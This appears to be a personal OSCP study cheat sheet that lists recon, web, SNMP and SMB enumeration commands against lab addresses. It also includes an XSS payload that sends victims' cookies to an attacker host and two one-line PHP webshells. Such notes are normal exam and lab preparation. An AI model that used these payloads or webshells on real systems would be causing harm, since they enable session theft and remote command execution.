# OSCP
OSCP Study Guide

## Table of Contents

## Enumeration and Recon

### NMAP:

Legend: 
```
-sN TCP Null Scan reveals the status of ports without directly querying them
-sV: Probe open ports to determine service/version info
-sC: equivalent to --script=default
-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
-sU: UDP Scan
-O: Enable OS detection
-g/--source-port <portnum>: Use given port number
-oA <basename>: Output in the three major formats at once
-A: Enable OS detection, version detection, script scanning, and traceroute
--version-light: Limit to most likely probes (intensity 2)
```

Examples Commands:

```
nmap -sC -sV -oA nmap\machine 10.10.10.1
```
```
nmap -A -T4 -p- -oA nmap\machine 10.10.10.1
```

UDP Scanning:

```
nmap -sU -oA nmap\machine_udp
```

Vulnerability Scanning:

```
sudo nmap --script vuln 10.11.1.10
```

### subdomain enumeration

```
dig axfr @10.10.10.13 cronos.htb
```

### Web Enumeration

Nikto scanning:

```
nikto -h http://10.10.10.1
```

Directory busting with different tools:

DIRB

```
dirb http://10.10.10.1
```

Gobuster

```
gobuster dir -u http://10.129.155.74:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x aspx
```

### Pentesting Website Applications

XSS Payloads:
Cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

Basic XSS form testing with either netcat listener or python web server
```
<img src=http://10.10.16.10/pwn.jpg/>
```

Cross Site scripting to dump base64 cookies. Make sure to url encode in burp with ctrl + u
```
<img src=x onerror=this.src='http://10.10.16.10/?cookies='+btoa(document.cookie) />
```
### Webshells

Reference: https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html

Simple PHP webshell for command execution

```
<?php system($_REQUEST ['cmd']) ?>
```

```
<?php system($_GET['cmd']); ?>
```

### Pentesting SNMP

Port 161 UDP

```
snmpwalk -c public -v2c 10.129.213.210
```

```
snmp-check 10.129.213.210
```

### Pentesting SMB

```
crackmapexec smb 10.129.70.254 
```

Detect anonymous shares that are open

```
smbclient -L //10.129.70.254
```

Null Authentication

```
smbclient -N -L //10.129.70.254
```

## Post Exploitation

### Downloading and Transferring Files

